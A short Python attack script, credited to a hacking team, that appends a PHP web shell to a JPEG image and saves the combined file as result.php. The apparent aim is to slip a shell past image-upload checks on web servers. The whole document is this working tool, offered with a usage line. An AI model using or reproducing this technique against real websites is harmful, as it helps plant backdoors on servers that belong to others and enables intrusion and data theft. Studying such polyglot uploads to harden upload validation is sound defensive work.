#!/usr/bin/env python
#Coded By X-Vector | Team of X-Fighter
#usage: python inject.py photo.jpg shell.php
from sys import argv
script, img, shell = argv
i = open(img,'rb').read()
i += open(shell,'rb').read()
f = open('result.php','wb').write(i)